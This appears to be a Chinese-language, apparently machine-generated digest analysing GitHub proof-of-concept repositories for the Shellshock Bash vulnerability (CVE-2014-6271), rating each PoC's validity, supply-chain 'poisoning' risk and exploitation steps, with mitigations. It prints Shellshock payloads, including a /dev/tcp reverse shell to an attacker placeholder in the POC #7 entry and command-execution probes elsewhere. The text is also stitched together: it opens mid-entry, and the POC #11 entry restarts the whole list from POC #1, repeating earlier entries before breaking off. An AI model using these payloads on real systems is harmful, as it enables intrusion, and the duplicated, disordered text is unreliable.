CVE-2014-6271，也被称为“Shellshock”，是GNU Bash中的一个严重漏洞。该漏洞源于Bash处理环境变量中函数定义后尾随字符串的方式存在缺陷，这使得攻击者可以通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。

**有效性：**
根据漏洞库信息、搜索结果，以及常见利用方式，该漏洞的PoC是有效的。漏洞库信息中列出了多个Expolit-DB的链接,以及许多厂商的确认信息,证明该漏洞的真实性。搜索结果也显示了大量的关于该漏洞的分析和利用案例。提供的POC代码`/tmp/c7baa98dd966ca6db5937f8832eb7ff6/README.md`，从文件名和路径来看，仅仅是一个README文件，内容只有`# CVE-2014-6271`，没有可执行的代码，但可以作为漏洞存在的标志。

**投毒风险：**
提供的POC代码`/tmp/c7baa98dd966ca6db5937f8832eb7ff6/README.md`的内容非常简单，几乎没有投毒代码的可能性。但是，由于该仓库本身存在于`/tmp`目录下，存在被恶意替换或者植入恶意脚本的可能性，因此具有一定的投毒风险。但是从代码本身来看，投毒风险极低,给出的预估值为10%。

**利用方式：**
1.  **环境变量注入：** 攻击者构造包含恶意代码的环境变量，例如：`(){ :; }; /bin/bash -c "恶意命令"`。
2.  **触发漏洞：** 将构造的环境变量传递给存在漏洞的Bash实例。这可以通过多种方式实现，例如：
    *   **HTTP请求：** 如果目标系统使用CGI脚本，可以通过修改HTTP请求头（如User-Agent）来设置环境变量。
    *   **SSH：** 如果OpenSSH启用了`ForceCommand`，可以通过设置环境变量来执行命令。
    *   **DHCP：** 某些DHCP客户端在执行脚本时会使用环境变量。
3.  **代码执行：** 当Bash解析包含恶意代码的环境变量时，会执行其中的命令，从而实现远程代码执行。

**总结：**
Shellshock是一个严重的安全漏洞，利用方式简单，影响范围广泛。虽然漏洞本身发布时间较早，但仍然可能存在于未及时更新的系统中。由于PoC的特殊性，直接利用README.md是不可能的，需要配合其他可执行的EXP进行测试。

**项目地址:** [Dilith006/CVE-2014-6271](https://github.com/Dilith006/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #5

**来源**: [CVE-2014-6271-FilipStudeny_-CVE-2014-6271-Shellshock-Remote-Command-Injection-.md](../2014/CVE-2014-6271-FilipStudeny_-CVE-2014-6271-Shellshock-Remote-Command-Injection-.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本，且配置不当允许通过HTTP Headers传递环境变量。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过在环境变量中嵌入恶意代码，当Bash shell执行这些环境变量时，从而执行任意命令。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞利用代码（Shellshock.py）有效。 搜索结果中多个链接都指向了该漏洞的细节和利用方法，证明了该漏洞的可利用性。漏洞利用代码本身也提供了两种payload：反向shell和文件浏览，具有一定的利用价值。

**投毒风险：**
分析提供的Python脚本 `Shellshock.py` ，代码主体结构清晰，主要功能是构造包含恶意代码的HTTP请求头，并发送到目标服务器。代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **payload的可定制性：** 脚本允许用户自定义payload，这本身不是问题。但如果攻击者替换或修改了默认的payload生成方式，可能会插入恶意代码，例如，下载并执行其他恶意脚本。
*   **CGI路径：** 脚本中包含一些常见的CGI路径，攻击者可能通过修改这些路径来尝试不同的攻击目标。
*   **回连地址：** reverse shell需要指定lhost和lport，如果作者在代码中预设了后门地址，可能导致攻击者在不知情的情况下，将shell反弹给作者。但是，代码中这两个参数由用户指定，降低了直接投毒的风险。
*   **代码混淆：** 代码没有进行明显的混淆，可读性较强，降低了隐藏恶意代码的概率。

综合考虑，认为此POC存在10%的投毒风险，主要是因为payload的可定制性，可能被用于传播修改后的恶意脚本。需要仔细审查代码，尤其关注payload生成和CGI路径部分。

**利用方式：**
利用方式是利用Bash解析环境变量时存在的漏洞，通过构造恶意的HTTP请求头（例如Cookie或Referer），在其中嵌入包含恶意代码的函数定义。当目标服务器上的Bash shell执行CGI脚本时，会解析这些HTTP头，从而触发漏洞，执行攻击者注入的命令。具体步骤如下：

1.  **确定目标：** 找到存在CGI脚本且可能受Shellshock影响的服务器。
2.  **构造Payload：** 根据需要选择payload类型（反向shell或文件浏览），并设置相应的参数（例如lhost、lport、echo）。
3.  **发送请求：** 使用`Shellshock.py`脚本构造包含恶意payload的HTTP请求，并发送到目标服务器的CGI脚本。
4.  **执行命令：** 如果目标存在漏洞，Bash shell会执行payload中的恶意代码，例如建立反向shell连接或执行文件浏览命令，并将结果返回给攻击者。

**项目地址:** [FilipStudeny/-CVE-2014-6271-Shellshock-Remote-Command-Injection-](https://github.com/FilipStudeny/-CVE-2014-6271-Shellshock-Remote-Command-Injection-)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #6

**来源**: [CVE-2014-6271-Gurguii_cgi-bin-shellshock.md](../2014/CVE-2014-6271-Gurguii_cgi-bin-shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或通过其他方式设置环境变量并调用Bash

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过特制的通过环境变量执行任意命令。利用方式如下：

1.  **有效性：** 提供的Python和Bash脚本都是有效的PoC代码。它们通过设置包含恶意代码的环境变量，然后尝试通过HTTP请求触发漏洞。
2.  **投毒风险：** 尽管代码主要用于利用Shellshock漏洞，但仍然存在轻微的投毒风险。具体分析如下：
    *   **README.md:**  该文件仅包含使用说明，无投毒代码。
    *   **shellshock.py:** Python脚本通过`requests`库发送HTTP请求，如果攻击者的服务器被攻陷，或者服务器返回恶意重定向，那么可能存在风险。但是代码本身没有明显的恶意代码。
    *   **shellshock.sh:** Bash脚本使用`curl`命令，同样存在curl命令被其他程序劫持，或者DNS投毒的风险。
    *  脚本接受用户提供的URL、LHOST和LPORT，如果用户使用了恶意的URL，可能会被服务器端记录或者进行其他攻击。这些不是脚本投毒，而是用户使用不当造成的。
    综合分析，主要风险在于依赖的外部命令(`curl`,`requests`)可能存在风险，以及用户使用脚本不当的风险,投毒风险较低，初步判定为10%。
3.  **利用方式：**
    *   **通过User-Agent头：**  PoC代码通过修改HTTP请求的User-Agent头，将包含恶意代码的环境变量发送到目标服务器。如果目标服务器上的CGI脚本或其他应用程序调用Bash来处理该请求，那么恶意代码就会被执行。
    *   **反弹Shell：**  PoC代码可以配置LHOST和LPORT参数，用于接收目标服务器的反弹Shell。攻击者可以在自己的机器上监听指定的端口，当目标服务器执行恶意代码时，会主动连接攻击者的机器，从而建立反弹Shell连接。
    *   **交互式命令执行：**  PoC代码也支持交互式命令执行。攻击者可以输入任意命令，PoC代码会将命令注入到环境变量中，并发送到目标服务器执行。

**搜索引擎结果补充：** 搜索引擎结果证实了该漏洞的严重性和广泛影响，并提供了一些检测和利用该漏洞的资源。

**项目地址:** [Gurguii/cgi-bin-shellshock](https://github.com/Gurguii/cgi-bin-shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #7

**来源**: [CVE-2014-6271-Jsmoreira02_CVE-2014-6271.md](../2014/CVE-2014-6271-Jsmoreira02_CVE-2014-6271.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，并且存在可以通过环境变量传递参数的CGI脚本或其他服务。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271（Shellshock）是一个存在于GNU Bash中的远程命令执行漏洞。漏洞的根源在于Bash处理环境变量中函数定义后附加字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，利用诸如Apache HTTP Server的mod_cgi模块、OpenSSH的ForceCommand功能、DHCP客户端脚本等场景，跨越权限边界执行任意shell命令。

**有效性评估：**

提供的漏洞利用代码（shellshock_exploit.py）旨在利用Shellshock漏洞，通过向目标URL发送特制的HTTP请求，其中User-Agent头包含恶意Bash代码，从而在目标服务器上执行任意命令。

README.md 文件中提供了检测和利用该漏洞的步骤。

根据漏洞库信息和搜索结果，该漏洞是一个广泛存在的严重漏洞，影响大量系统和服务。提供的POC代码与漏洞描述一致，因此，该POC代码**有效**。

**投毒风险评估：**

检查`shellshock_exploit.py`脚本和`README.md`文件，未发现明显的恶意代码。脚本的主要功能是构造包含漏洞利用代码的HTTP请求，并在本地监听反弹shell。风险点可能在于以下几点：

1.  **Payload定制：** 脚本允许指定LHOST和LPORT，如果用户不小心使用了错误的IP地址或端口，可能会导致连接到恶意服务器。
2.  **依赖性：** 脚本依赖于`requests`库，如果安装了被篡改的`requests`库，可能会存在风险。
3.  **Netcat依赖：** 脚本依赖于本地的 `nc` 命令, 如果本地的 `nc` 命令被恶意替换, 可能存在风险。

总体而言，该代码的投毒风险较低，主要集中在使用者的误操作和对外部依赖项的信任上。投毒风险估计为10%。

**漏洞利用方式：**

1.  **确定目标：** 找到运行存在漏洞Bash版本的服务器，并且该服务器运行着可以通过环境变量传递参数的服务，例如CGI脚本。
2.  **构造Payload：** 构造包含恶意Bash代码的环境变量，例如：`() { :; }; /bin/bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1`
3.  **发送请求：** 通过HTTP请求或其他方式将构造的Payload作为环境变量传递给目标服务器。
4.  **执行命令：** 目标服务器上的Bash解释器会执行恶意代码，从而执行攻击者指定的命令。
5.  **反弹Shell：** 在上面的Payload示例中，恶意代码会尝试创建一个反弹Shell，将目标服务器的Shell连接到攻击者的IP地址和端口。

**缓解措施：**

1.  升级Bash到最新版本。
2.  检查和更新所有使用Bash脚本的服务，确保它们不会受到环境变量的影响。
3.  使用入侵检测系统（IDS）和入侵防御系统（IPS）来检测和阻止Shellshock攻击。

**项目地址:** [Jsmoreira02/CVE-2014-6271](https://github.com/Jsmoreira02/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #8

**来源**: [CVE-2014-6271-K3ysTr0K3R_CVE-2014-6271-EXPLOIT.md](../2014/CVE-2014-6271-K3ysTr0K3R_CVE-2014-6271-EXPLOIT.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者通过构造的环境变量执行任意代码。

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许设置环境变量并调用Bash。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是GNU Bash中的一个严重漏洞。该漏洞源于Bash处理环境变量中函数定义后trailing string的方式。攻击者可以利用此漏洞，通过构造包含恶意代码的环境变量，在目标系统上执行任意命令。

**有效性分析：**
提供的Python POC代码通过发送包含恶意构造的HTTP请求来利用此漏洞。它首先尝试通过User-Agent、Referer和Cookie头注入测试payload来检测漏洞是否存在，测试Payload特征是会输出特定字符串，验证是否可以执行代码，存在漏洞后再注入包含反向Shell的payload来利用该漏洞。

**投毒风险分析：**
代码存在潜在的投毒风险，主要体现在以下几个方面：
1.  **反向Shell地址：** 攻击者可能修改`lhost`和`lport`变量，将反向Shell指向恶意服务器，从而控制受害者机器。当前代码中并没有明显的恶意行为，但是依赖用户提供的参数。
2.  **Payload修改：** 攻击者可能修改`payload`变量，执行其他恶意命令，例如下载并执行恶意文件，删除系统文件等。当前Payload是反向shell，不属于投毒行为。
3.  **其他依赖：** 代码依赖于`pwncat`库，这个库本身可能存在安全问题或被篡改，从而引入新的安全风险。
4. **连接处理:** `pwncat.manager.Manager` 中可能包含未知的后门或恶意代码。 
综合来看，投毒风险较低（约10%），主要来自于参数修改和对依赖库的信任。

**利用方式：**
1.  **漏洞检测：**  POC首先向目标URL发送包含特殊构造header的HTTP请求(User-Agent, Referer, Cookie)。 这些header中包含恶意的Bash函数定义。
2.  **命令执行：**  如果目标系统存在漏洞，Bash在解析这些环境变量时，会执行注入的恶意代码。
3.  **反向Shell：**  利用代码中，注入的Payload为反向Shell，建立从目标系统到攻击者控制机器的TCP连接，从而允许攻击者远程控制目标系统。反向连接的地址由`lhost`和`lport`指定。
4. **监听连接:** 在攻击机上启动监听进程，等待目标机器的连接。

**漏洞缓解措施：**
*   升级Bash到最新版本。
*   避免在CGI脚本中使用Bash处理用户输入。
*   使用安全编码实践，验证所有用户输入。
*   使用入侵检测系统（IDS）和入侵防御系统（IPS）监控和阻止恶意流量。

**项目地址:** [K3ysTr0K3R/CVE-2014-6271-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2014-6271-EXPLOIT)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #9

**来源**: [CVE-2014-6271-MuirlandOracle_CVE-2014-6271-IPFire.md](../2014/CVE-2014-6271-MuirlandOracle_CVE-2014-6271-IPFire.md)

## CVE-2014-6271 IP Fire Shellshock RCE

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** IPFire

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 2.15

**利用条件:** 目标系统运行存在漏洞的Bash版本，且可以通过HTTP(S)访问到受影响的CGI脚本 (index.cgi)。可能需要用户名和密码进行身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造恶意的环境变量来执行任意代码。提供的Python POC代码专门针对IPFire防火墙<=2.15版本。利用方式如下：

1.  **漏洞原理：** Bash在处理环境变量时，允许在函数定义后附加额外的命令。如果这些环境变量被传递给执行Bash脚本的CGI程序，附加的命令就会被执行。
2.  **攻击向量：**  攻击者通过HTTP请求的header中设置包含恶意代码的环境变量，利用IPFire的`index.cgi`脚本触发漏洞。
3.  **POC代码分析：** 该POC首先尝试连接到目标IPFire服务器，如果需要则进行HTTP基本身份验证。然后，它构造一个包含恶意Bash代码的环境变量，并通过HTTP请求的headers将其发送到`index.cgi`。恶意代码利用函数定义后的trailing string执行任意命令。POC还包含了一个伪shell，允许交互式地执行命令。
4.  **投毒风险分析：** POC代码主要功能是漏洞验证和利用，但仍存在一定投毒风险。例如：
    *   代码中包含`eval`或`exec`等执行任意代码的函数，虽然目前用于执行用户输入的命令，但攻击者可能修改这些部分来执行恶意代码。
    *   该脚本依赖于`requests`库，攻击者可能篡改此脚本，要求安装恶意依赖包，从而执行恶意代码
    *  该脚本在执行远程命令后直接打印到输出，没有进行过滤，如果远程服务器被入侵，可能会发送恶意字符到客户端，导致客户端被攻击。
  因此，保守估计存在10%的投毒风险，主要集中在潜在的恶意依赖、命令执行的输出处理以及代码篡改的可能性。

**总结：** 提供的POC代码利用Shellshock漏洞，通过构造包含恶意Bash代码的环境变量，实现在目标IPFire系统上执行任意命令。由于利用了HTTP(S)协议，攻击通常可以通过网络远程发起。尽管漏洞已经存在多年，但仍然有很多系统没有修复，因此该漏洞仍然具有较高的现实威胁。

**项目地址:** [MuirlandOracle/CVE-2014-6271-IPFire](https://github.com/MuirlandOracle/CVE-2014-6271-IPFire)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #10

**来源**: [CVE-2014-6271-RAJMadhusankha_Shellshock-CVE-2014-6271-Exploitation-and-Analysis.md](../2014/CVE-2014-6271-RAJMadhusankha_Shellshock-CVE-2014-6271-Exploitation-and-Analysis.md)

## CVE-2014-6271 Shellshock漏洞利用

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** 1.14 - 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，并且存在可利用的攻击面，如CGI脚本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash shell中的高危漏洞。该漏洞允许攻击者通过在环境变量中注入恶意代码来执行任意命令。根据提供的漏洞库信息、搜索引擎结果和漏洞利用代码，以下是对漏洞利用有效性、投毒风险和利用方式的分析：

**有效性：**

根据漏洞库信息，CVE-2014-6271允许远程攻击者通过特制的环境变量执行任意代码。漏洞利用代码（README.md）提供了一个利用 `exploit/multi/http/apache_mod_cgi_bash_env_exec` 模块的Metasploit POC，用于攻击运行CGI脚本的Apache服务器。多个搜索引擎结果，如NVD, CISA, Qualys等，也确认了该漏洞的存在和危害，并提供了缓解措施。综合来看，提供的POC代码是有效的。

**投毒风险：**

漏洞利用代码本身是 Metasploit 模块的配置说明，用于利用已知的 Shellshock 漏洞。直接分析 README.md 文件，投毒风险较低，但仍存在以下风险：

*   **作者恶意修改：** 理论上，作者可能在提供文件的其他地方（例如，如果存在其他脚本或配置）隐藏了恶意代码。但仅根据提供信息无法判断。
*   **依赖项风险：** Metasploit 模块本身依赖于 Metasploit Framework，如果 Metasploit Framework 被篡改，可能存在风险。

综合评估，投毒风险较低，约为10%。主要来自于潜在的未公开文件篡改。

**利用方式：**

1.  **确定目标：** 找到运行Bash，且存在CGI脚本或其他途径可以设置环境变量的系统。
2.  **发送恶意请求：** 构造包含恶意代码的环境变量。常见的攻击方式是通过HTTP请求头，特别是当服务器使用CGI脚本处理请求时。HTTP头会被转换为环境变量传递给Bash。
3.  **代码执行：** 当Bash处理包含恶意代码的环境变量时，会执行注入的命令。
4.  **反弹shell（POC中的PAYLOAD）：**  利用 `cmd/unix/reverse_netcat` payload在目标主机上执行`nc`，反弹shell到攻击者的机器。

**防范措施：**

*   立即更新 Bash 到最新版本。
*   禁用未使用的 CGI 脚本。
*   使用 Web 应用防火墙 (WAF) 过滤恶意请求。
*   监控 HTTP 请求日志。

**项目地址:** [RAJMadhusankha/Shellshock-CVE-2014-6271-Exploitation-and-Analysis](https://github.com/RAJMadhusankha/Shellshock-CVE-2014-6271-Exploitation-and-Analysis)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #11

**来源**: [CVE-2014-6271-RadYio_CVE-2014-6271.md](../2014/CVE-2014-6271-RadYio_CVE-2014-6271.md)

# CVE-2014-6271

> 📦 该CVE有 **28** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2014-6271-0xN7y_CVE-2014-6271.md](../2014/CVE-2014-6271-0xN7y_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过环境变量与Bash交互

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，也被称为ShellShock，是GNU Bash中的一个高危漏洞。攻击者可以通过构造包含恶意代码的环境变量，利用Bash解析函数定义时存在的缺陷来执行任意命令。漏洞利用方式如下：

1.  **漏洞原理：** Bash在解析环境变量时，如果环境变量的值包含函数定义，则会尝试执行函数定义后面的字符串。如果攻击者能够控制环境变量的内容，就可以注入恶意代码。

2.  **利用方式：** 攻击者通常通过以下几种方式注入环境变量：
    *   **HTTP请求头：** 如果Web服务器使用CGI脚本，攻击者可以在HTTP请求头中设置包含恶意代码的环境变量，例如User-Agent。
    *   **SSH ForceCommand：** 在OpenSSH配置中，ForceCommand选项允许在用户登录时强制执行特定命令。攻击者可以利用此选项设置包含恶意代码的环境变量。
    *   **DHCP客户端：** DHCP客户端在请求IP地址时，可以设置环境变量。攻击者可以伪造DHCP服务器，向受害者发送包含恶意代码的DHCP响应。

3.  **POC分析：** 提供的POC代码 `CVE-2014-6271.py`  通过构造包含恶意代码的User-Agent HTTP头来利用此漏洞。脚本接受目标URL和要执行的命令作为参数，然后向目标URL发送包含特制User-Agent头的HTTP请求。
    *   **有效性：** 该POC代码有效，如果目标系统存在漏洞，可以执行任意命令。
    *   **投毒风险：**  查看提供的POC代码，未发现明显的投毒代码。代码结构清晰，功能明确，主要目的是发送包含漏洞利用代码的HTTP请求。**因此投毒风险为0%**。

4.  **缓解措施：**
    *   升级Bash到最新版本。
    *   检查并修复所有可能受到漏洞影响的应用程序和服务，例如Web服务器、OpenSSH和DHCP客户端。
    *   限制CGI脚本的使用，并对所有输入进行严格的验证。

根据搜索引擎的结果，该漏洞是一个严重的互联网基础设施风险，因为许多常见的配置都允许远程代码执行。一些供应商已经发布了补丁来解决这个问题。因此，使用提供的POC代码进行漏洞验证是合理的，但需要注意潜在的风险。

**项目地址:** [0xN7y/CVE-2014-6271](https://github.com/0xN7y/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #2

**来源**: [CVE-2014-6271-AlissonFaoli_Shellshock.md](../2014/CVE-2014-6271-AlissonFaoli_Shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许未经身份验证的远程攻击者在受影响的系统上执行任意代码。

**影响版本:** GNU Bash 1.14 至 4.3

**利用条件:** 目标系统需要运行存在漏洞的Bash版本，并且通过CGI脚本、OpenSSH ForceCommand或其他方式暴露了环境变量注入点。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞源于Bash处理环境变量中函数定义后附加字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，在Bash执行时注入并执行任意命令。利用方式通常涉及以下步骤：

1.  **确定攻击目标：** 寻找使用Bash处理请求的应用程序或服务，例如CGI脚本、OpenSSH服务器（使用ForceCommand）或DHCP客户端。
2.  **构造恶意环境变量：** 创建一个包含函数定义和恶意命令的环境变量。例如：`() { :; }; echo vulnerable`
3.  **发送包含恶意环境变量的请求：** 将构造的环境变量通过HTTP请求头、SSH连接或其他方式传递给目标系统。
4.  **触发漏洞执行：** 当目标系统执行Bash并处理包含恶意环境变量的请求时，漏洞将被触发，导致恶意命令执行。

提供的Python POC脚本 `shellshock.py` 旨在利用此漏洞。该脚本接受目标URL、攻击者IP地址（LHOST）和端口（LPORT）作为参数。它通过构造包含反向shell命令的User-Agent头，向目标URL发送HTTP GET请求。如果目标系统存在漏洞，它将执行反向shell命令，允许攻击者连接到目标系统并执行任意命令。

**关于投毒风险的分析：**

代码中主要功能是利用Shellshock漏洞，建立反向连接。审查代码，发现可能存在轻微投毒风险的地方在于，攻击者可以修改payload，执行任意命令。但是，由于脚本本身就是为了利用漏洞而设计的，因此，这不算是作者有意植入的后门，而是漏洞利用本身的性质决定的。

  * LICENSE和README.md文件相对标准，没有发现恶意代码。
  * `shellshock.py`脚本，虽然主要功能是漏洞利用，但如果被不道德的人使用，仍然会产生危害。

综合评估，该仓库的投毒风险较低，大约在5%左右。主要风险在于脚本被恶意使用，而非代码本身包含隐藏的恶意功能。

**项目地址:** [AlissonFaoli/Shellshock](https://github.com/AlissonFaoli/Shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #3

**来源**: [CVE-2014-6271-Brandaoo_CVE-2014-6271.md](../2014/CVE-2014-6271-Brandaoo_CVE-2014-6271.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统需要使用Bash，并且存在允许通过环境变量传递参数的场景，例如CGI脚本，OpenSSH ForceCommand等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271 (Shellshock) 漏洞允许攻击者通过在环境变量中构造恶意的函数定义，从而在Bash执行时注入并执行任意代码。该漏洞的利用方式是：

1.  **漏洞原理：** Bash在处理环境变量时，如果环境变量的值包含函数定义，Bash会先执行函数定义之后的内容。如果函数定义后的字符串包含恶意代码，则会被执行。
2.  **利用方式：** 攻击者构造包含恶意代码的环境变量，例如 `(){ :; }; /usr/bin/id`，然后将该环境变量传递给目标系统。
3.  **触发点：** 目标系统上运行的Bash脚本或程序在执行时，会解析并处理这些环境变量，从而触发漏洞，执行攻击者注入的恶意代码。
4.  **POC分析：** 提供的`shellshock.sh`脚本通过`curl`命令发送带有特殊构造的`User-Agent`头的HTTP请求。`User-Agent`头的内容为 `() { :; }; echo VULNERABLE`。如果目标网站的服务器使用Bash处理HTTP请求头（例如，通过CGI脚本），并且Bash存在Shellshock漏洞，那么`echo VULNERABLE`命令会被执行，并在HTTP响应中返回 "VULNERABLE" 字符串，脚本据此判断目标站点存在漏洞。
5.  **有效性分析：** 该POC代码基本有效，可以用于检测目标服务器是否存在Shellshock漏洞。但是，该脚本的检测方法较为简单，仅通过`User-Agent`头进行检测，可能存在一定的漏报情况。更复杂的利用场景可能需要修改POC代码。
6.  **投毒风险分析：** 该仓库中存在一定的投毒风险。`shellshock.sh`本身的代码较为简单，主要功能是发送HTTP请求并检查响应。潜在的风险在于：
    *   **依赖项风险：** 虽然脚本本身只依赖于`curl`，但是如果攻击者修改脚本，引入其他的外部命令或者脚本，可能会引入恶意代码。
    *   **命令注入风险：** 虽然脚本避免了直接执行用户输入，但是，如果攻击者能够控制`curl`的参数或者其他命令的参数，仍然可能存在命令注入的风险。
    *  **README.md风险:** 有攻击者会修改README.md文件，放入恶意链接，诱导用户点击。
    根据代码的复杂度、依赖项以及潜在的命令注入风险，估计投毒风险为10%。

**项目地址:** [Brandaoo/CVE-2014-6271](https://github.com/Brandaoo/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #4

**来源**: [CVE-2014-6271-Dilith006_CVE-2014-6271.md](../2014/CVE-2014-6271-Dilith006_CVE-2014-6271.md)

## CVE-2014-6271-Bash-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在Bash并且可以通过某种方式设置环境变量。常见的攻击场景包括：OpenSSH的ForceCommand、Apache HTTP Server的mod_cgi/mod_cgid、DHCP客户端等。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为“Shellshock”，是GNU Bash中的一个严重漏洞。该漏洞源于Bash处理环境变量中函数定义后尾随字符串的方式存在缺陷，这使得攻击者可以通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。

**有效性：**
根据漏洞库信息、搜索结果，以及常见利用方式，该漏洞的PoC是有效的。漏洞库信息中列出了多个Expolit-DB的链接,以及许多厂商的确认信息,证明该漏洞的真实性。搜索结果也显示了大量的关于该漏洞的分析和利用案例。提供的POC代码`/tmp/c7baa98dd966ca6db5937f8832eb7ff6/README.md`，从文件名和路径来看，仅仅是一个README文件，内容只有`# CVE-2014-6271`，没有可执行的代码，但可以作为漏洞存在的标志。

**投毒风险：**
提供的POC代码`/tmp/c7baa98dd966ca6db5937f8832eb7ff6/README.md`的内容非常简单，几乎没有投毒代码的可能性。但是，由于该仓库本身存在于`/tmp`目录下，存在被恶意替换或者植入恶意脚本的可能性，因此具有一定的投毒风险。但是从代码本身来看，投毒风险极低,给出的预估值为10%。

**利用方式：**
1.  **环境变量注入：** 攻击者构造包含恶意代码的环境变量，例如：`(){ :; }; /bin/bash -c "恶意命令"`。
2.  **触发漏洞：** 将构造的环境变量传递给存在漏洞的Bash实例。这可以通过多种方式实现，例如：
    *   **HTTP请求：** 如果目标系统使用CGI脚本，可以通过修改HTTP请求头（如User-Agent）来设置环境变量。
    *   **SSH：** 如果OpenSSH启用了`ForceCommand`，可以通过设置环境变量来执行命令。
    *   **DHCP：** 某些DHCP客户端在执行脚本时会使用环境变量。
3.  **代码执行：** 当Bash解析包含恶意代码的环境变量时，会执行其中的命令，从而实现远程代码执行。

**总结：**
Shellshock是一个严重的安全漏洞，利用方式简单，影响范围广泛。虽然漏洞本身发布时间较早，但仍然可能存在于未及时更新的系统中。由于PoC的特殊性，直接利用README.md是不可能的，需要配合其他可执行的EXP进行测试。

**项目地址:** [Dilith006/CVE-2014-6271](https://github.com/Dilith006/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #5

**来源**: [CVE-2014-6271-FilipStudeny_-CVE-2014-6271-Shellshock-Remote-Command-Injection-.md](../2014/CVE-2014-6271-FilipStudeny_-CVE-2014-6271-Shellshock-Remote-Command-Injection-.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本，且配置不当允许通过HTTP Headers传递环境变量。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

